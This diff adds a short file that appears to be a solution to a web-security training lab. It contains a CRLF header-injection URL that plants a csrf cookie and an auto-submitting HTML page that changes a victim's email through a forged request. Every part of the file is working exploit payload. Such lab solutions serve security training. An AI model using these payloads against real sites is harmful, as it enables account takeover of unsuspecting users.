@@ -1,0 +1,20 @@
+// Test the cookie injection vulnerability
+/?search=kiddie%0d%0aSet-Cookie%3a+csrf%3dselfInventCSRFToken
+
+// Malicious CSRF HTML
+<html>
+<body>
+
+<img src="https://acd41fd51f3c7e0b80aa2bb200dc0092.web-security-academy.net/?search=kiddie%0d%0aSet-Cookie%3a+csrf%3dptekcfZt1U9cTkwHlWQDvY9PeGv8iG01">
+
+<script>history.pushState('','','/')</script>
+<form action="https://acd41fd51f3c7e0b80aa2bb200dc0092.web-security-academy.net/email/change-email" method="POST">
+<input type="hidden" name="email" value="kiddie&#64;test&#46;com">
+<input type="hidden" name="csrf" value="ptekcfZt1U9cTkwHlWQDvY9PeGv8iG01">
+<input type="submit" value="Submit request">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+</body>                   
+</html>
